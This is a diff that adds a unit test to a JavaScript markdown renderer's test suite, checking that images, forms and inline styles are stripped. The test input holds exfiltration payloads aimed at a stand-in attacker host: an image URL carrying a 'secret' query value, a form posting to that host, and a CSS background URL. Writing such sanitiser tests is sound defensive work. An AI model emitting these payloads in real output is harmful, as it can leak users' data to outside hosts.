@@ -24,4 +24,10 @@ describe('renderMarkdown', () => {
     expect(html).toContain('target="_blank"');
     expect(html).toContain('rel="noopener noreferrer"');
   });
+
+  it('drops images, forms and styles (no way to carry data out)', () => {
+    const html = renderMarkdown('![x](https://evil.example/?d=secret) <form action="https://evil.example"><input name=a></form> <span style="background:url(https://evil.example)">t</span>');
+    expect(html).not.toContain('evil.example');
+    expect(html).toContain('t');
+  });
 });
